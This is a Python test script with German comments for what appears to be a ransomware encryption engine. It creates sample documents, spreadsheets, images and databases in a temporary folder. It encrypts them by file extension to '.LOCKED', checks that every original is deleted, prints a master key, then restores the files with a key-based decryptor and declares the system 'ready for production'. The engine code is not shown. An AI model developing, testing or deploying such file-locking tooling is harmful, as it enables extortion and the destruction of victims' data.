#!/usr/bin/env python3
"""
TEST ENCRYPTION & DECRYPTION
=============================
Testet die Encryption/Decryption Engine
"""

import sys
import os
import json
import tempfile
from pathlib import Path

# Add crypt module to path
sys.path.insert(0, os.path.dirname(__file__))

from crypt.encryption_engine import EncryptionEngine
from crypt.decryption_engine import DecryptionEngine

def create_test_files(test_dir):
    """Erstelle Test-Dateien"""
    test_dir = Path(test_dir)
    test_dir.mkdir(exist_ok=True)
    
    # Erstelle verschiedene Test-Dateien
    test_files = {
        'document.txt': b'This is a test document with sensitive data.',
        'spreadsheet.csv': b'Name,Value\nTest,12345\nSecret,99999',
        'code.py': b'#!/usr/bin/env python3\nprint("secret code here")',
        'image.jpg': os.urandom(10000),  # Random binary data
        'database.db': os.urandom(50000),
    }
    
    created_files = []
    for filename, content in test_files.items():
        file_path = test_dir / filename
        with open(file_path, 'wb') as f:
            f.write(content)
        created_files.append(file_path)
        print(f"[✓] Created: {filename} ({len(content)} bytes)")
    
    return created_files

def test_encryption_decryption():
    """Test kompletten Encryption/Decryption Flow"""
    
    print("\n" + "="*70)
    print("ENCRYPTION & DECRYPTION TEST")
    print("="*70 + "\n")
    
    # Erstelle temporäres Test-Verzeichnis
    with tempfile.TemporaryDirectory() as temp_dir:
        test_dir = Path(temp_dir) / "test_files"
        
        # PHASE 1: Erstelle Test-Dateien
        print("[PHASE 1] Creating test files...")
        test_files = create_test_files(test_dir)
        print(f"[✓] Created {len(test_files)} test files\n")
        
        # PHASE 2: Verschlüssele Dateien
        print("[PHASE 2] Encrypting files...")
        engine = EncryptionEngine(
            encryption_extension=".LOCKED",
            pbkdf2_iterations=100000
        )
        
        target_extensions = {'.txt', '.csv', '.py', '.jpg', '.db'}
        success = engine.encrypt_directory(
            test_dir,
            target_extensions=target_extensions,
            recursive=True,
            verbose=True
        )
        
        if not success:
            print("[!] Encryption failed!")
            return False
        
        master_key = engine.get_master_key_hex()
        print(f"\n[+] Master Key: {master_key[:30]}...")
        print(f"[+] Encrypted files: {len(engine.encrypted_files)}")
        print(f"[+] Total size: {engine.total_size_encrypted / 1024:.1f} KB\n")
        
        # Verifiziere dass Original-Dateien gelöscht wurden
        remaining_originals = list(test_dir.glob("*"))
        remaining_originals = [f for f in remaining_originals if not str(f).endswith('.LOCKED')]
        
        if remaining_originals:
            print(f"[!] ERROR: Original files still exist: {remaining_originals}")
            return False
        
        print("[✓] All original files deleted\n")
        
        # PHASE 3: Entschlüssele Dateien
        print("[PHASE 3] Decrypting files...")
        decryptor = DecryptionEngine(
            master_key_hex=master_key,
            pbkdf2_iterations=100000
        )
        
        success = decryptor.decrypt_directory(
            test_dir,
            encryption_extension=".LOCKED",
            recursive=True,
            verbose=True
        )
        
        if not success:
            print("[!] Decryption failed!")
            return False
        
        print(f"\n[+] Decrypted files: {len(decryptor.decrypted_files)}")
        print(f"[+] Failed: {len(decryptor.failed_files)}\n")
        
        # PHASE 4: Verifiziere dass Dateien wiederhergestellt wurden
        print("[PHASE 4] Verifying decrypted files...")
        
        restored_files = list(test_dir.glob("*"))
        restored_files = [f for f in restored_files if not str(f).endswith('.LOCKED')]
        
        if len(restored_files) != len(test_files):
            print(f"[!] ERROR: Expected {len(test_files)} files, got {len(restored_files)}")
            return False
        
        print(f"[✓] All {len(restored_files)} files restored\n")
        
        # Prüfe Datei-Inhalte
        print("[PHASE 5] Verifying file contents...")
        
        expected_contents = {
            'document.txt': b'This is a test document with sensitive data.',
            'spreadsheet.csv': b'Name,Value\nTest,12345\nSecret,99999',
            'code.py': b'#!/usr/bin/env python3\nprint("secret code here")',
        }
        
        all_correct = True
        for filename, expected_content in expected_contents.items():
            file_path = test_dir / filename
            with open(file_path, 'rb') as f:
                actual_content = f.read()
            
            if actual_content == expected_content:
                print(f"[✓] {filename}: Content matches")
            else:
                print(f"[!] {filename}: Content MISMATCH!")
                all_correct = False
        
        if not all_correct:
            return False
        
        print("\n" + "="*70)
        print("[✓✓✓] ALL TESTS PASSED!")
        print("="*70)
        print("""
Encryption/Decryption Flow verified:
  1. Created test files ✓
  2. Encrypted all files ✓
  3. Deleted original files ✓
  4. Decrypted all files ✓
  5. Verified file contents ✓

System ready for production!
        """)
        
        return True

if __name__ == '__main__':
    try:
        success = test_encryption_decryption()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[!] Test failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
